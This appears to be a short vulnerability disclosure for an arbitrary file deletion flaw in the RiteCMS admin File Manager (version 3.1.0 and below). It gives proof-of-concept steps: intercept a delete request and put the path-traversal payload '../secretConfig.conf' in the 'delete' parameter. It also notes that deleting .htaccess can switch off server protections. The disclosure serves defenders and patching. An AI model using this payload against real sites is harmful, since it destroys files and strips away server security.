# Description  #
################

# RiteCMS version 3.1.0 and below suffers from an arbitrary file deletion vulnerability in Admin Panel. Exploiting the vulnerability allows an authenticated attacker to delete any file in the web root (along with any other file on the server that the PHP process user has the proper permissions to delete). Furthermore, an attacker might leverage the capability of arbitrary file deletion to circumvent certain webserver security mechanisms such as deleting .htaccess file that would deactivate those security constraints.

# PoC to delete secretConfig.conf file in web root  #
#####################################################


Steps to Reproduce:

1. Login as admin
2. Go to File Manager
3. Delete any file
4. Intercept the request and replace current file name to any files on the server via parameter "delete".

# Assumed there is a secretConfig.conf file in web root

PoC: param delete - Deleting secretConfig.conf file in web root, so the payload will be "../secretConfig.conf"
